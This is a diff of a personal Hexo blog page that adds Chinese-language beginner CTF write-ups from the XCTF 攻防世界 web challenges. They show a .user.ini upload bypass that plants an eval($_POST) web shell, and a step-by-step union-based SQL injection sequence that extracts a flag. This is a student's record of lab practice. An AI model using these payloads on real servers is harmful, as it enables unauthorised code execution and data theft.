@@ -75,6 +75,165 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-php-rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/10/php-rce/" class="article-date">
+  <time class="dt-published" datetime="2023-07-10T02:16:09.000Z" itemprop="datePublished">2023-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/10/php-rce/">php_rce</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="攻防世界-php-rce"><a href="#攻防世界-php-rce" class="headerlink" title="攻防世界 php_rce"></a>攻防世界 php_rce</h1><p>hello 大家，好久没写过blog了，也好久没做过题了，假期开始，便回来做题，更新假期ctf学习的第一篇blog<br>这篇<br><img src="https://s2.loli.net/2023/07/10/embwIBGL3x8YHhQ.png" alt="屏幕截图 2023-07-10 102205.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://wuziqiannian.github.io/2023/07/10/php-rce/" data-id="cljwn3cah0002ksus21n6foox" data-title="php_rce" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-easyupload" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/15/easyupload/" class="article-date">
+  <time class="dt-published" datetime="2023-01-15T08:18:23.000Z" itemprop="datePublished">2023-01-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/01/15/easyupload/">easyupload</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>攻防世界 web新手 easyupload</strong>(其实一点儿也不easy)<br>简要介绍：两个 选项：选择文件与上传<br>大概率是文件上传漏洞<br>于是开始试他的过滤限制：<br>经过不停的上传与不停的失败，试出来大概几个限制：<br>1.文件内不能有php字符<br>2.后缀不能有 .php<br>3.文件类型<br>这个到这里，我现有的知识已经不够了，于是上网搜索，搜到了这个(.user.ini)<br>接下来，课外小常识：.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。<br>看php.ini中的配置项，沮丧地发现，只要稍微敏感的配置项，都是PHP_INI_SYSTEM模式的（甚至是php.ini only的），包括disable_functions、extension_dir、enable_dl等。 不过，我们可以很容易地借助.user.ini文件来构造一个“后门”。</p>
+<p>Php配置项中有两个比较有意思的项：<br>1.auto_append_file<br>2.auto_prepend_file<br>auto_prepend_file是指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</p>
+<p>so，下面是步骤(前几步都成功了最后一步莫名翻车 இ௰இ)<br>1.构建.user.ini文件<br>GIF89a(绕过文件类型限制)<br>auto_prepend_file&#x3D;a.jpg<br>2.传入有马的图<br>GIF89a<br>&lt;？&#x3D;eval（$_POST【‘c’】）；？&gt;(用的中文符号，怕出事)<br>(均抓包上传，记得修改content_type)<br>3.用菜刀，蚁剑连接，就可以。<br>(&#x2F;(ㄒoㄒ)&#x2F;~~，菜刀连接其他的打不开，蚁剑连不上，翻车了)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://wuziqiannian.github.io/2023/01/15/easyupload/" data-id="cljwn3cai0003ksus8gwbf1lh" data-title="easyupload" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-NewsCenter" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/08/NewsCenter/" class="article-date">
+  <time class="dt-published" datetime="2023-01-08T02:24:13.000Z" itemprop="datePublished">2023-01-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/01/08/NewsCenter/">NewsCenter</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>攻防世界 web新手 NewsCenter</strong><br>进入题目环境，只有一个搜索框，与一个回显框（极度简化我的描述），猜测是sql，于是挑了一个关键词Hello,开始尝试。<br>1.首先构造了一个语句检测是否有注入点：Hello’ or 1&#x3D;1#<br>  结果：所用新闻回显，证明存在注入点<br>2.那就正式开始注入：<br>    (1) 检测列数：Hello’ order by 3 #(ps:那个3，是通过1，2,3一点点得到的，改成4，就出错了，不知道有没有更好的办法)<br>    (2) 检测回显位置：Hello’union select 1,2,3 #(ps:根据3列构造的语句)结果显示竖着排列的2 3，证明在2 3位置回显<br>        (ps:其实这道题做的时候，对着书跟着做的，结果忘记检测列数与回显位置了，然后构造的语句只有一列，疯狂出错，人都傻了(━┳━　━┳━))<br>    (3) 注入表名：Hello’ union select 1,union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() #<br>            得到结果为 news，secret_table<br>                      3<br>        (ps:1.information_schema是默认数据库，储存着所有数据库名、表名。<br>            2.group_concat是用“，”连接结果并显示在一个字段的函数。<br>            3.database()返回当前数据库的名称)<br>    (4) 猜测flag在secret_table中，<br>        注入字段名：Hello’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’secret_table’ #<br>            得到结果 id,fl4g<br>                    3<br>    (5) 查看内容：union select 1,fl4g,3 from secret_table #<br>            得到结果 QCTF{sq1_inJec7ion_ezzz}</p>
+<p>(ps:图床出问题了(&#x2F;(ㄒoㄒ)&#x2F;~~))</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://wuziqiannian.github.io/2023/01/08/NewsCenter/" data-id="cljwn3cae0000ksus37mkb78t" data-title="NewsCenter" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-baby-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/08/baby-web/" class="article-date">
+  <time class="dt-published" datetime="2023-01-08T01:44:39.000Z" itemprop="datePublished">2023-01-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/01/08/baby-web/">baby_web</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>攻防世界 web新手 baby_web</strong><br><img src="https://raw.githubusercontent.com/wuziqiannian/img/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230108_093111.png" alt="题目"><br>题目描述：想想初始页面是哪个<br>提示：应该是index.php<br><img src="https://raw.githubusercontent.com/wuziqiannian/img/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230108_093119.png" alt="进入环境"><br>解答过程：<br>1.尝试访问index.php，但都会跳转到1.php<br>（到这里其实已经不知道为什么了，上网搜的（&#x2F;（ㄒoㄒ）&#x2F;~~）<br>2.抓包，跳转到1.index后,进入repeter模块，将1.php修改为index.php<br>3.在hex查看，得到flag<br><img src="https://raw.githubusercontent.com/wuziqiannian/img/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230108_093338.png" alt="flag"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://wuziqiannian.github.io/2023/01/08/baby-web/" data-id="cljwn3cag0001ksus4na1cli2" data-title="baby_web" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-php伪协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/12/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="article-date">
@@ -352,7 +511,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a></li></ul>
     </div>
   </div>
 
@@ -365,23 +524,23 @@
       <ul>
         
           <li>
+            <a href="/2023/07/10/php-rce/">php_rce</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/15/easyupload/">easyupload</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/08/NewsCenter/">NewsCenter</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/08/baby-web/">baby_web</a>
+          </li>
+        
+          <li>
             <a href="/2022/12/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">php伪协议</a>
-          </li>
-        
-          <li>
-            <a href="/2022/12/11/simple-php/">simple_php</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/10/xff-referer/">xff_referer</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/05/simple-js/">simple_js</a>
-          </li>
-        
-          <li>
-            <a href="/2022/11/02/backup/">backup</a>
           </li>
         
       </ul>
@@ -397,7 +556,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       
-      &copy; 2022 梧子千年<br>
+      &copy; 2023 梧子千年<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
